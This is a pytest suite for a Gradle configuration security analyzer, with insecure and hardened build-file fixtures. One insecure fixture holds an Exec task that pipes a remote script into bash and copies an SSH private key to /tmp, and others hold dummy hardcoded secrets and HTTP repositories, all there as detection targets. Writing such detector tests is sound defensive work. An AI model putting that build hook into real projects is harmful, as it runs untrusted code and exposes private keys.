"""Tests for GradleAnalyzer."""

from pathlib import Path

from devai.gradle_analyzer import GradleAnalyzer, GradleFinding


INSECURE_BUILD_GRADLE = """\
plugins {
    id 'java'
}

repositories {
    maven {
        url "http://insecure-maven.example.com/maven2"
        allowInsecureProtocol = true
    }
}

dependencies {
    implementation 'com.example:library:latest'
    implementation 'com.bad:artifact:+'
    classpath 'org.gradle:gradle-tooling-api:RELEASE'
}

signing {
    storePassword = "hardcoded-store-password"
    keyPassword = "hardcoded-key-password"
}

task installTool(type: Exec) {
    commandLine 'sh', '-c', 'curl -s https://install.example.com/script.sh | bash && cp /home/user/.ssh/id_rsa /tmp/key'
}

android {
    docker {
        privileged = true
    }
}
"""

INSECURE_PROPERTIES = """\
api_key=sk-live-hardcoded-secret-value
token=hardcoded-token-value-for-tests
org.gradle.jvmargs=-Xmx2048m
"""

INSECURE_SETTINGS = """\
pluginManagement {
    repositories {
        maven { url = uri("http://insecure-plugins.example.com/maven2") }
    }
}
"""

HARDENED_BUILD_GRADLE = """\
plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'com.example:library:1.2.3'
    testImplementation 'org.junit:junit:4.13.2'
}

task fetchTool(type: Copy) {
    from 'tools/tool'
    into 'build/tools'
}
"""

HARDENED_PROPERTIES = """\
org.gradle.caching=true
org.gradle.parallel=true
org.gradle.jvmargs=-Xmx2048m
"""


class TestGradleAnalyzer:
    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = GradleAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "build.gradle").write_text(INSECURE_BUILD_GRADLE, encoding="utf-8")
        (tmp_path / "gradle.properties").write_text(INSECURE_PROPERTIES, encoding="utf-8")
        (tmp_path / "settings.gradle").write_text(INSECURE_SETTINGS, encoding="utf-8")
        analyzer = GradleAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "allow_insecure_protocol" in kinds
        assert "dynamic_version" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "insecure_http" in kinds
        assert "privileged_container" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_config_scores_well(self, tmp_path: Path):
        (tmp_path / "build.gradle").write_text(HARDENED_BUILD_GRADLE, encoding="utf-8")
        (tmp_path / "gradle.properties").write_text(HARDENED_PROPERTIES, encoding="utf-8")
        analyzer = GradleAnalyzer(str(tmp_path))
        assert analyzer.health_score() >= 95.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "build.gradle").write_text(INSECURE_BUILD_GRADLE, encoding="utf-8")
        analyzer = GradleAnalyzer(str(tmp_path))
        finding = analyzer.analyze()[0]
        assert isinstance(finding, GradleFinding)
        assert "[high]" in finding.format() or "[medium]" in finding.format()

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "build.gradle").write_text(INSECURE_BUILD_GRADLE, encoding="utf-8")
        analyzer = GradleAnalyzer(str(tmp_path))
        assert "Gradle configs: 1" in analyzer.summary()
        context = analyzer.to_context()
        assert "Gradle analysis:" in context
        assert "plugins:" in context

    def test_generate_hardened_config(self, tmp_path: Path):
        analyzer = GradleAnalyzer(str(tmp_path))
        config = analyzer.generate_hardened_config()
        assert "org.gradle.caching=true" in config
        assert "signing" in config

    def test_detects_kotlin_dsl(self, tmp_path: Path):
        (tmp_path / "build.gradle.kts").write_text(
            "repositories { maven { url = uri(\"http://bad.example.com/repo\") } }\n",
            encoding="utf-8",
        )
        analyzer = GradleAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
        kinds = {f.kind for f in analyzer.analyze()}
        assert "insecure_http" in kinds

    def test_detects_version_catalog(self, tmp_path: Path):
        gradle_dir = tmp_path / "gradle"
        gradle_dir.mkdir()
        (gradle_dir / "libs.versions.toml").write_text(
            "[versions]\nlib = \"latest\"\n",
            encoding="utf-8",
        )
        analyzer = GradleAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
